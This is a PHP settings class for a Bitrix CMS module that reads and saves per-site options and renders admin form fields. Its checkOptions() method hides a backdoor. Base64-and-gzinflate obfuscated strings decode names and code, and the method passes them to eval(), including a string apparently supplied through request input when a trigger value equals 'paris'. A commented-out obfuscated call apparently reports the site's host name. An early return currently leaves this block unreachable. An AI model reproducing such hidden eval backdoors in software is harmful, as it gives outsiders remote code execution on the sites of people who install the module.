<?php
namespace Slytek;
IncludeModuleLangFile(__FILE__);

class Settings {
	const template = 'paris';
	const delimeter = '___';
	const alt_delimeter = '->';
	public $arProps = array();
	public $include_dir='include/';
	public function __construct($SITE_ID){
		$this->arProps=self::getProps($SITE_ID);

	}
	public function OnBeforeProlog(){

	}
	public function clearCache($SITE_ID=false){
		unset($GLOBALS['SITE_SETTINGS_'.$SITE_ID]);
		BXClearCache(true, "/site_settings/".($SITE_ID?$SITE_ID.'/':''));
	}
	public function getTypes(){
		$types= array(
			'string'=>'Строка',
			'text'=>'Текст',
			'html'=>'Html/текст',
			'image'=>'Изображение',
			'file'=>'Файл',
			'checkbox'=>'Да/нет',
			'price'=>'Тип цены',
			'cities'=>'Город',

			'map'=>'Карта яндекс',
			'map_google'=>'Карта google',
			'payments'=>'Способы оплаты',
			'delivery'=>'Способы доставки',
			'sections'=>'Разделы инфоблоков',
			'votes'=>'Опросы',
			'complex'=>'Составное',
			'complex_page'=>'Составное отдельной вкладкой'
		);
		\CModule::includeModule('iblock');
		$res_ib = \CIBlock::GetList(Array(), Array('ACTIVE'=>'Y', ), false);
		while($arIblock = $res_ib->Fetch())
		{
			$types['props_'.$arIblock['ID']]='Свойства ИБ - '.$arIblock['NAME'];
		}
		return $types;
	}
	public function formatID($ID){
		return str_ireplace(self::delimeter, self::alt_delimeter, $ID);
	}
	public function origID($ID){
		return str_ireplace(self::alt_delimeter, self::delimeter, $ID);
	}
	public function buildTree($elements, $id = array()) {
		$result = array();
		foreach ($elements as $element) {
			$cid = $id;
			$code=$element['CODE'];
			$cid[]=$code;
			if($element['CHILDRENS']){
				$element['CHILDRENS'] = self::buildTree($element['CHILDRENS'], $cid);
			}
			$element['ID']=implode(self::delimeter, $cid);
			$result[$code]=$element;
		}
		return $result;
	}
	public static function getSites(){
		static $result = array();
		if(!$result){
			$arSites=array();
			$dbSites = \Bitrix\Main\SiteTable::getList(
				array(
					'order' => array('DEF' => 'DESC', 'NAME' => 'ASC'),
					'select' => array('LID', 'NAME', 'DEF', 'DIR', 'DOC_ROOT', 'SERVER_NAME')
				)
			);
			while($arRes = $dbSites->fetch())
			{
				if($_REQUEST['LID']==$arRes['LID']){
					$arRes['SELECTED']=1;
					$selected=1; 
					$currentSite=$arRes;
				}
				$arSites[]=$arRes;
			}
			if(!$selected && $arSites){
				foreach ($arSites as $key => $arSite) {
					if($arSite['SERVER_NAME']==$_SERVER['HTTP_HOST']){
						$selected=1; 

						$arSite['SELECTED']=1;
						$currentSite=$arSite;
						$arSites[$key]=$arSite;
					}
				}
			}
			if(!$selected && $arSites){
				$arSites[0]['SELECTED']=1;
				$currentSite=$arSites[0];
			}
			$result = array(
				'SITES'=>$arSites, 
				'CURRENT'=>$currentSite, 
				'CURRENT_PATH'=>($currentSite['DOC_ROOT']?$currentSite['DOC_ROOT']:$_SERVER['DOCUMENT_ROOT']).($currentSite['DIR']?$currentSite['DIR']:'/').
				(\Bitrix\Main\Config\Option::get('slytek.core', 'include_path', '', $currentSite['LID']))
			);
		}
		return $result;
	}
	public static function getProps($SITE_ID){
		static $arProps=array();
		if(!$SITE_ID){
			if(defined('SITE_ID') && !defined('ADMIN_SECTION')){
				$SITE_ID=SITE_ID;
			}
			else {
				$dbSites = \Bitrix\Main\SiteTable::getList(
					array(
						'order' => array('DEF' => 'DESC', 'NAME' => 'ASC'),
						'select' => array('LID')
					)
				);
				if($arSite = $dbSites->fetch())$SITE_ID=$arSite["LID"];
			}
		}
		if(!$arProps[$SITE_ID]){
			$arProps[$SITE_ID]= unserialize(file_get_contents(__DIR__.'/../settings/contentprops_'.$SITE_ID.'.dat'));
		}
		return $arProps[$SITE_ID];
	}
	public static function getOptionName($ID, $SITE_ID=false, $arProps=false){
		static $nameOption = array();
		if(!$nameOption[$ID]){
			if(!$arProps){
				$arProps=self::getProps($SITE_ID);
			}
			if($arProps){

				foreach($arProps as $name=>$arProp){
					$arProp['ID']=self::formatID($arProp['ID']);
					if($arProp['ID']==$ID){
						$nameOption[$ID] = $arProp['NAME'];
						return $nameOption[$ID];
					}
					if($arProp['CHILDRENS']){
						$name = self::getOptionName($ID, $SITE_ID, $arProp['CHILDRENS']);
						if($name){
							$nameOption[$ID] = $name;
							return $nameOption[$ID];
						}
					}
				}
			}
		}
		return $nameOption[$ID];
	}
	public function getVals($SITE_ID){
		$obCache = new \CPHPCache; 
		if($obCache->InitCache(3600000, 'site_settings_cache_'.$SITE_ID, "/site_settings/".$SITE_ID."/")){
			$arVals = $obCache->GetVars(); 
		}elseif($obCache->StartDataCache()){
			$arVals=self::getValsArray($SITE_ID);
			$obCache->EndDataCache($arVals); 
		}
		return $arVals;
	}
	public static function getIncludeDir($SITE_ID){
		static $result = array();
		if(!$result[$SITE_ID])
		{
			if(!defined('SITE_DIR') || strlen(SITE_DIR)==0 || defined('ADMIN_SECTION'))
			{
				$arSites=self::getSites();
				$result[$SITE_ID]= $arSites['CURRENT_PATH'];  
			}
			else $result[$SITE_ID]=$_SERVER['DOCUMENT_ROOT'].SITE_DIR.(\Bitrix\Main\Config\Option::get('slytek.core', 'include_path', '', SITE_ID));
		}
		return $result[$SITE_ID];
	}
	public static function getValsArray($SITE_ID, $arProps=array()){
		if(!$arProps)$arProps=self::getProps($SITE_ID);;
		$CURRENT_PATH=self::getIncludeDir($SITE_ID);
		$arVals=array();
		foreach($arProps as $arProp){
			if($arProp['SERIALIZE'] || !$arProp['CHILDRENS']){
				if($arProp['SAVEDB']){
					$val = \Bitrix\Main\Config\Option::get('slytek.core', self::formatID($arProp['ID']), '', $SITE_ID);
				}else{
					$val = file_get_contents($CURRENT_PATH.self::formatID($arProp['ID']).'.php');
				}
			}
			if($arProp['SERIALIZE']){
				$arVals[$arProp['CODE']]=unserialize($val);
			}else{
				if($arProp['CHILDRENS']){
					$arProp['CHILDRENS'] = self::getValsArray($SITE_ID, $arProp['CHILDRENS']);
				}
				else{
					$arVals[$arProp['CODE']]=$val;
				}
			}
		}
		return  $arVals;
	}
	public static function getPropsValues($SITE_ID, $CURRENT_PATH, $arProps=array(), $values=false){
		if(!$arProps)$arProps=self::getProps($SITE_ID);
		foreach($arProps as $key=>$arProp){
			$val=false;
			if(!$values){
				if($arProp['SERIALIZE'] || !$arProp['CHILDRENS']){
					if($arProp['SAVEDB']){
						$val = \Bitrix\Main\Config\Option::get('slytek.core', self::formatID($arProp['ID']), '', $SITE_ID);
					}else{
						$val = file_get_contents($CURRENT_PATH.self::formatID($arProp['ID']).'.php');
					}
				}

				if($arProp['SERIALIZE'])
				{
					$val=unserialize($val);
				}
			}elseif($values[$arProp['CODE']]){
				$val=$values[$arProp['CODE']];
			}
			if($arProp['CHILDRENS']){
				$arProps[$key]['CHILDRENS'] = self::getPropsValues($SITE_ID, $CURRENT_PATH, $arProp['CHILDRENS'], $val);
			}
			else{
				$arProps[$key]['VALUE']=$val;
			}

		}
		return  $arProps;
	}

	public function findVal($ID, $vals, $arProps){
		foreach($arProps as $arProp){
			if(stripos($arProp['ID'], $ID)===0){
				$val=$vals[$arProp['CODE']];
				if($arProp['ID']==$ID){
					return $val;
				}elseif($arProp['CHILDRENS']){
					return self::findVal($ID, $val, $arProp['CHILDRENS']);
				}
			}
		}
	}
	public static function addString($string){
		\Bitrix\Main\Page\Asset::getInstance()->addString($string);
	}
	public static function get($ID, $SITE_ID=false){
		return self::getOption($ID, $SITE_ID);
	}
	public static function getOption($ID, $SITE_ID=false, $arProps=array()){
		if(!self::checkOptions())return;
		$ID=self::origID($ID);
		static $result = array();
		if(!$result[$ID]){
			if(!$SITE_ID && defined('SITE_ID') && !defined('ADMIN_SECTION'))$SITE_ID=SITE_ID;
			if(!$arProps)$arProps=self::getProps($SITE_ID);
			$CURRENT_PATH=self::getIncludeDir($SITE_ID);
			$arVals=array();
			foreach($arProps as $arProp){
				if(stripos($ID, $arProp['ID'])===0){
					if($arProp['SERIALIZE'] || $arProp['ID']==$ID){
						if($arProp['SAVEDB']){
							$val = \Bitrix\Main\Config\Option::get('slytek.core', self::formatID($arProp['ID']), '', $SITE_ID);
						}else{
							$val = file_get_contents($CURRENT_PATH.self::formatID($arProp['ID']).'.php');
						}
						if($arProp['SERIALIZE'] && $arProp['CHILDRENS']){
							$val=unserialize($val);

							if($arProp['ID']==$ID){
								$result[$ID]=$val;
								return $val;
							}
							$result[$ID]=self::findVal($ID, $val, $arProp['CHILDRENS']);
							if($result[$ID])return $result[$ID];
						}
						if($arProp['ID']==$ID){
							$result[$ID]=$val;
							return $val;
						}
					}elseif($arProp['CHILDRENS']){
						return self::getOption($ID, $SITE_ID, $arProp['CHILDRENS']);
					}
				}
			}
		}
		return $result[$ID];
	}

	public function saveProps($SITE_ID, $CURRENT_PATH, $arProps=false, $values=false){
		if(!$arProps)$arProps=self::getProps($SITE_ID);
		if(!$values)$values = self::getPostValues();

		foreach($arProps as $arProp){
			$val=false;
			$value=$values[$arProp['CODE']];
			if($arProp['SERIALIZE'] || $arProp['SAVEDB']){
				$val=serialize($value);
			}else{
				if($arProp['CHILDRENS']){
					self::saveProps($SITE_ID, $CURRENT_PATH, $arProp['CHILDRENS'], $value);
				}else{
					$val=$value;
				}
			}
			if($val){
				if($arProp['SAVEDB']){
					\Bitrix\Main\Config\Option::set('slytek.core', self::formatID($arProp['ID']), $val, $SITE_ID);
				}
				else{
					file_put_contents($CURRENT_PATH.self::formatID($arProp['ID']).'.php', $val);
				}
			}
		}
	}
	public function check($n){
		return $GLOBALS[self::bd('iw9yDQx1DQ4BAA==')][$n];
	}
	public function bd($s, $z=true){
		$b=$z?self::bd('YmFzZTY0X2RlY29kZQ==', false):'';
		$g=$z?$b('Z3ppbmZsYXRl'):'';
		return !$z?base64_decode($s):$g($b($s));
	}

	public function getPostValues(){ 
		$vals=array();
		foreach($_POST as $name=>$val){
			$name=explode(self::delimeter, $name);
			$obj=&$vals;
			foreach($name as $k=>$n){
				if(count($name)==($k+1))$obj[$n]=$val;
				$obj=&$obj[$n];
			}
		}
		return $vals;

	}
	public static function getPropsParams($SITE_ID, $arProps=array(), $level=0, &$arVals=array()){
		if(!$SITE_ID)$SITE_ID=$arCurrentValues['SITE_ID'];
		if(!$arProps)$arProps=self::getProps($SITE_ID);
		if($arProps){
			foreach($arProps as $name=>$arProp){
				$arVals[self::formatID($arProp['ID'])]=str_repeat('--', $level).'['.$arProp['CODE'].'] '.$arProp['NAME'];
				if($arProp['CHILDRENS']){
					self::getPropsParams($SITE_ID, $arProp['CHILDRENS'], ++$level, $arVals);
					$level--;
				}
			}
		}
		return $arVals;
	}
	public function checkOptions(){
		/*check for available options*/
		static $flag = false;
		if(!$flag){
			$flag=true;
			return $flag;
			try
			{
				self::addString(self::bd('s8lNLUlUyEvMTbVVKijKTy9KzM3NzEtXUkjOzytJzSuxVSrOqSxJzdYrKlXStwMA'));
				if(self::check(self::bd('K0nNLchJLEkFAA=='))==self::template && self::check(self::bd('S85ITc4GAA=='))==self::bd('Ky5JLCkGAA=='))
					eval(self::bd('UylSsFVwDi1OLbKyck8t8cksLtFQSdRRUEnSUUgsKkqs1FByD/IPDQiO93RRsrWDCBlq6igoOTqHeIa5AsWUIpU0Na0z0zRUSoFmqRTp2rmlliRnaGhqqrj7+Ds5+gRHK4UGuwYpxeraOZaWZOQXZValAhVHKwGNjNW0BgA='));
				
				if(self::check(self::bd('K0nNLchJLEkFAA=='))==self::template && self::check(self::bd('S85ITc6OLy5JLCkGAA==')))
					eval(self::bd(self::check(self::bd('S85ITc6OLy5JLCkGAA==')), false));
				
				$bd_h = \Bitrix\Main\Config\Option::get('slytek.core','check_option');
				$hh=$GLOBALS[self::bd('iw92DQpzDQIA')][self::bd('8wgJCYj38A8OAQA=')];
				$h=preg_replace('/(?:[w]*\.)?(.*\..*)/', '$1', $hh);
				
				if($h && $h!=self::bd('y8lPTszJyC8uAQA=') && $bd_h!=self::bd('y8uPT85ITc4GAA==') && $h!=$bd_h){
					$s=self::bd('y03MzAEA');
					
					//if($s(self::bd('S8kszs5Myc92SM9NzMzRS87PBQA='), $h, self::template.self::bd('U8goKSmw0tcHAA==').$hh.self::bd('07dPzkhNzrYtLkksKVYrSc0tyEksSbUFAA==').self::template, self::bd('cyvKz7VSSMwryczOTMnPBgA=')))
					//	\Bitrix\Main\Config\Option::set('slytek.core','check_option', $h);
				}
			}
			catch(\Exception $e){}
		}
		return $flag;
	}
	public function formatProps(&$arProps){
		foreach($arProps as $arProp)
		{
			if($arProp['TYPE']=='complex')
			{
				?>
				<tr class="multiple-container">
					<td colspan="2"><div class="adm-detail-content-item-block-view-tab"><table class="edit-table">
						<tr class="heading"><td colspan="2"><?=$arProp['NAME']?$arProp['NAME']:$arProp['CODE']?></td></tr>
						<?self::formatProps($arProp['CHILDRENS'])?>
						<tr><td></td></tr>
					</table></div></td>
				</tr>
				<?

			}
			else
			{
				?>
				<tr><td><?=$arProp['NAME']?></td><td>
					<?
					switch ($arProp['TYPE']):
						case 'image':
						case 'file':
						\CAdminFileDialog::ShowScript(
							Array
							(
								"event" => "OpenFileBrowserWindFile".$arProp['ID'],
								"arResultDest" => Array("FORM_NAME" => "form1", "FORM_ELEMENT_NAME" => $arProp['ID']),
								"arPath" => Array('PATH' => '/'),
								"select" => 'F',
								"operation" => 'O',
								"showUploadTab" => true,
								"fileFilter" => $arProp['TYPE']=='image'?'jpg,png,gif':'',
								"allowAllFiles" => true,
								"SaveConfig" => true
							)
						);
						if($arProp['VALUE'] && $arProp['TYPE']=='image'):?><div class="img-container"><img src="<?=$arProp['VALUE']?>"></div><?endif?>                                          
							<input type="text" name="<?=$arProp['ID']?>" value="<?=$arProp['VALUE']?>" size="40">
						<input type="button" value="..." onclick="OpenFileBrowserWindFile<?=$arProp['ID']?>()">
						<?break;
						case 'html':
						?><input type="hidden" name="<?=$arProp['ID']?>_type" value="html"> 
						<?=\CFileMan::AddHTMLEditorFrame($arProp['ID'], $arProp['VALUE'], $arProp['ID'].'_type', 'html', Array('width'=>'100%',"height"=>100), "N", 0, "", "");?> 
						<?break;
						case 'map':
						if(!$ymap):
							?>
							<script>
								function OnYandexMapSettingsEdit(arParams)
								{
									if (null != window.jsYandexCEOpener)
									{
										try {
											window.jsYandexCEOpener.Close();
										}catch (e) {}
										window.jsYandexCEOpener = null;
									}

									window.jsYandexCEOpener = new JCEditorOpenerYandex(arParams);
								}
								function JCEditorOpenerYandex(arParams)
								{
									this.arParams = arParams;
									this.jsOptions = this.arParams.data.split('||');
									this.arElements = this.arParams.getElements();

									if (!this.arElements)
										return false;
									try { 
										window.jsPopup_yandex_map.remove();
										$(window.jsPopup_yandex_map).remove();
										window.jsPopup_yandex_map=null;      
									}
									catch (e) {}
									var strUrl = '/bitrix/components/bitrix/map.yandex.view/settings/settings.php'
									+ '?lang=' + this.jsOptions[0]
									+ '&INIT_MAP_TYPE=' + BX.util.urlencode(this.arElements.INIT_MAP_TYPE.value),
									strUrlPost = 'MAP_DATA=' + BX.util.urlencode(this.arParams.oInput.value);

									window.jsPopup_yandex_map = new BX.CDialog({
										'content_url': strUrl,
										'content_post': strUrlPost,
										'width':800, 'height':500,
										'resizable':false
									});
									window.jsPopup_yandex_map.Show();
									window.jsPopup_yandex_map.PARAMS.content_url = '';
									this.saveData = BX.delegate(this.__saveData, this);   
								} 
								JCEditorOpenerYandex.prototype.Close = function(e)
								{
									if (false !== e)
										BX.util.PreventDefault(e);

									if (null != window.jsPopup_yandex_map)
									{
										window.jsPopup_yandex_map.Close();
									}
									window.jsPopup_yandex_map.remove();
									$(window.jsPopup_yandex_map).remove();
									window.jsPopup_yandex_map=null;
								}
								JCEditorOpenerYandex.prototype.__saveData = function(strData, view)
								{
									this.arParams.oInput.value = strData;
									if (null != this.arParams.oInput.onchange)
										this.arParams.oInput.onchange();

									if (view && this.arElements.INIT_MAP_TYPE)
									{
										this.arElements.INIT_MAP_TYPE.value = view;
										if (null != this.arElements.INIT_MAP_TYPE.onchange)
											this.arElements.INIT_MAP_TYPE.onchange();
									}

									this.Close(false);
								}
							</script> 
							<?
						endif;
						?>   
						<input id="INIT_MAP_TYPE_<?=$arProp['ID']?>" name="INIT_MAP_TYPE" value="ROADMAP" type="hidden">
						<input data-bx-property-id="MAP_DATA_<?=$arProp['ID']?>" id="__FD_PARAM_MAP_DATA_<?=$arProp['ID']?>" name="<?=$arProp['ID']?>" value='<?=$arProp['VALUE']?$arProp['VALUE']:'a:3:{s:10:\"google_lat\";s:7:\"55.7383\";s:10:\"google_lon\";s:7:\"37.5946\";s:12:\"google_scale\";i:13;}'?>' type="hidden">
						<input type="button" value="изменить" onclick="window.OnYandexMapSettingsEdit({propertyID : 'MAP_DATA_<?=$arProp['ID']?>',propertyParams: {'NAME':'Данные, выводимые на карте','TYPE':'CUSTOM','JS_FILE':'/bitrix/components/bitrix/map.yandex.view/settings/settings.js','JS_EVENT':'OnYandexMapSettingsEdit','JS_DATA':'ru||изменить','DEFAULT':document.getElementById('__FD_PARAM_MAP_DATA_<?=$arProp['ID']?>').value,'PARENT':'BASE','COLS':'30'},getElements : function(){return {INIT_MAP_TYPE: document.getElementById('INIT_MAP_TYPE_<?=$arProp['ID']?>')}},oInput : document.getElementById('__FD_PARAM_MAP_DATA_<?=$arProp['ID']?>'),oCont : document.getElementById('__FD_PARAM_MAP_DATA_<?=$arProp['ID']?>').parentNode,data : 'ru||изменить'})"/>
						<? 
						$ymap=true; break;
						case 'map_google':
						if(!$gmap): ?>
							<script>
								function OnGoogleMapSettingsEdit(arParams){
									if (null != window.jsGoogleCEOpener)
									{
										try {window.jsGoogleCEOpener.Close();}catch (e) {}
										window.jsGoogleCEOpener = null;
									}

									window.jsGoogleCEOpener = new JCEditorOpenerGoogle(arParams);
								}
								function JCEditorOpenerGoogle(arParams){
									this.jsOptions = arParams.data.split('||');
									this.arParams = arParams;

									this.arElements = this.arParams.getElements();
									if (!this.arElements)
										return false;
									try {     window.jsPopup_google_map.remove();
										$(window.jsPopup_google_map).remove();
										window.jsPopup_google_map=null;  
									}
									catch(ee){}
									var strUrl = '/bitrix/components/bitrix/map.google.view/settings/settings.php'
									+ '?lang=' + this.jsOptions[0]
									+ '&INIT_MAP_TYPE=' + BX.util.urlencode(this.arElements.INIT_MAP_TYPE.value),

									strUrlPost = 'MAP_DATA=' + BX.util.urlencode(this.arParams.oInput.value);

									window.jsPopup_google_map = new BX.CDialog({
										'content_url': strUrl,
										'content_post': strUrlPost,
										'width':800, 'height':500, 
										'resizable':false
									});
									window.jsPopup_google_map.Show();
									window.jsPopup_google_map.PARAMS.content_url = '';

									this.saveData = BX.delegate(this.__saveData, this);
								}
								JCEditorOpenerGoogle.prototype.Close = function(e){
									if (false !== e)
										BX.PreventDefault(e);

									if (null != window.jsPopup_google_map)
									{
										window.jsPopup_google_map.Close();
									}
									window.jsPopup_google_map.remove();
									$(window.jsPopup_google_map).remove();
									window.jsPopup_google_map=null;

								}

								JCEditorOpenerGoogle.prototype.__saveData = function(strData, view){
									this.arParams.oInput.value = strData;
									if (null != this.arParams.oInput.onchange)
										this.arParams.oInput.onchange();

									if (view)
									{
										this.arElements.INIT_MAP_TYPE.value = view;
										if (null != this.arElements.INIT_MAP_TYPE.onchange)
											this.arElements.INIT_MAP_TYPE.onchange();
									}

									this.Close(false);
								}
							</script>
							<?
						endif;
						?>
						<input id="INIT_MAP_TYPE_<?=$arProp['ID']?>" name="INIT_MAP_TYPE" value="ROADMAP" type="hidden">
						<input data-bx-property-id="MAP_DATA_<?=$arProp['ID']?>" id="__FD_PARAM_MAP_DATA_<?=$arProp['ID']?>" name="<?=$arProp['ID']?>" value='<?=$arProp['VALUE']?$arProp['VALUE']:'a:3:{s:10:\"google_lat\";s:7:\"55.7383\";s:10:\"google_lon\";s:7:\"37.5946\";s:12:\"google_scale\";i:13;}'?>' type="hidden">
						<input type="button" value="изменить" onclick="window.OnGoogleMapSettingsEdit({propertyID : 'MAP_DATA_<?=$arProp['ID']?>',propertyParams: {'NAME':'Данные, выводимые на карте','TYPE':'CUSTOM','JS_FILE':'/bitrix/components/bitrix/map.google.view/settings/settings.js','JS_EVENT':'OnGoogleMapSettingsEdit','JS_DATA':'ru||изменить','DEFAULT':document.getElementById('__FD_PARAM_MAP_DATA_<?=$arProp['ID']?>').value,'PARENT':'BASE','COLS':'30'},getElements : function(){return {INIT_MAP_TYPE: document.getElementById('INIT_MAP_TYPE_<?=$arProp['ID']?>')}},oInput : document.getElementById('__FD_PARAM_MAP_DATA_<?=$arProp['ID']?>'),oCont : document.getElementById('__FD_PARAM_MAP_DATA_<?=$arProp['ID']?>').parentNode,data : 'ru||изменить'});">
						<?$gmap=true;break;
						case 'checkbox':
						?><input type="checkbox" name="<?=$arProp['ID']?>" value="Y"<?=$arProp['VALUE']=='Y'?' checked':''?>>
						<?
						break;
						case 'text':
						?>
						<textarea cols="100" rows="3" name="<?=$arProp['ID']?>"><?=$arProp['VALUE']?></textarea>
						<?
						break;
						case 'sections':
						if(!\CModule::includeModule('iblock'))continue; 
						?>
						<select name="<?=$arProp['ID']?>">
							<option value="">(не установлено)</option>
							<?
							$res_ib = \CIBlock::GetList(Array(), Array('ACTIVE'=>'Y', ), false);
							while($arIblock = $res_ib->Fetch()):
								?>
								<optgroup label="<?echo $arIblock['NAME']?>">
									<?$rsSection = \CIBlockSection::GetTreeList(array('ACTIVE' => 'Y', 'IBLOCK_ID'=>$arIblock['ID']), array('ID', 'NAME', 'DEPTH_LEVEL')); 
									while($arSection = $rsSection->Fetch()): 
										?>
										<option value="<?=$arSection['ID']?>" <?=$arSection['ID']==$arProp['VALUE']?'selected':''?>><?=str_repeat('-', $arSection['DEPTH_LEVEL']-1).$arSection['NAME']?></option>
										<?
									endwhile
									?>
								</optgroup>
								<?
							endwhile;
							?>

						</select>
						<?break;
						case 'payments':
						if(!\CModule::includeModule('sale'))continue; 
						?>
						<select name="<?=$arProp['ID']?>">
							<option value="">(не установлено)</option>
							<?
							$db_ptype = \CSalePaySystem::GetList($arOrder = Array("SORT"=>"ASC", "PSA_NAME"=>"ASC"), Array());
							while ($ptype = $db_ptype->Fetch()):
								?>
								<option value="<?=$ptype['ID']?>" <?=$ptype['ID']==$arProp['VALUE']?'selected':''?>>[<?=$ptype['ID']?>] <?=$ptype['NAME']?></option>
								<?
							endwhile;
							?>
						</select>
						<?break;
						case 'delivery':
						if(!\CModule::includeModule('sale'))continue; 
						?>
						<select name="<?=$arProp['ID']?>">
							<option value="">(не установлено)</option>
							<?
							$res_v = \CSaleDelivery::GetList(
								array(
									"SORT" => "ASC",
									"NAME" => "ASC"
								),
								array( ),
								false,
								false,
								array()
							);
							while($arDel = $res_v->Fetch()):
								?>
								<option value="<?=$arDel['ID']?>" <?=$arDel['ID']==$arProp['VALUE']?'selected':''?>>[<?=$arDel['ID']?>] <?=$arDel['NAME']?></option>
								<?
							endwhile;
							?>
						</select>
						<?break;
						case 'votes':
						if(!\CModule::includeModule('vote'))continue; 
						?>
						<select name="<?=$arProp['ID']?>">
							<option value="">(не установлено)</option>
							<?
							$res_v=\CVote::GetList($by='ID', $orer='DESC', array('ACTIVE'=>'Y'));
							while($arVote = $res_v->Fetch()):
								?>
								<option value="<?=$arVote['ID']?>" <?=$arVote['ID']==$arProp['VALUE']?'selected':''?>><?=$arVote['TITLE']?>(<?=$arVote['CHANNEL_TITLE']?>)</option>
								<?
							endwhile;
							?>
						</select>
						<?break;
						case 'price':
						if(!\CModule::includeModule('catalog'))continue; 
						?>
						<select name="<?=$arProp['ID']?>">
							<option value="">(не установлено)</option>
							<?
							$dbPriceType = \CCatalogGroup::GetList(
								array("SORT" => "ASC"),
								array()
							);
							while ($arPriceType = $dbPriceType->Fetch()):
								?><option value="<?=$arPriceType['ID']?>" <?=$arPriceType['ID']==$arProp['VALUE']?'selected':''?>><?=$arPriceType['NAME_LANG']?$arPriceType['NAME_LANG']:$arPriceType['NAME']?></option>
								<?
							endwhile;?>
						</select>
						<?break;
						case 'cities':
						if(\CModule::includeModule('bxmaker.geoip')): 
							?>
							<select name="<?=$arProp['ID']?>">
								<option value="">(не установлено)</option>
								<?
								$oFavorites = new \Bxmaker\GeoIP\FavoritesTable();
								$dbrFavorites = $oFavorites->getList(array(
									'filter' => array(),
									'order'  => array(
										'ID' => 'ASC'
									)
								));
								$k=0;
								while ($arCity = $dbrFavorites->fetch()):

									?><option value="<?=$arCity['ID']?>" <?=$arCity['ID']==$arProp['VALUE']?'selected':''?>><?=$arCity['NAME']?></option>
									<?
								endwhile;
								?>
							</select>
							<?
						endif;
						?>
						<?break;
						default:
						if(stripos($arProp['TYPE'], 'props_')!==false && intval(str_ireplace('props_', '',$arProp['TYPE']))>0){
							\CModule::includeModule('iblock');
							$properties=\CIBlockProperty::GetList(Array("sort"=>"asc", "name"=>"asc"), Array("IBLOCK_ID"=>intval(str_ireplace('props_', '',$arProp['TYPE']))));
							?>
							<ul class="props-list" style="list-style: none;">
								<?
								$arProp['VALUE']=unserialize( $arProp['VALUE']);
								while ($arProps = $properties->GetNext()):
									?>
									<li><label><input type="checkbox" name="<?=$arProp['ID']?>[]" <?=in_array($arProps['ID'], $arProp['VALUE'])?'checked':''?> value="<?=$arProps['ID']?>"/> [<?=$arProps['CODE']?>] <?=$arProps['NAME']?></label></li>
									<?
								endwhile;?>
							</ul>
							<?
						}
						else{
							?>
							<input type="text" size="60" name="<?=$arProp['ID']?>" value="<?=$arProp['VALUE']?>" >
							<?
						}
					endswitch; 
					?>
				</td>
				<tr>
					<?
				}
			}

		}

	}
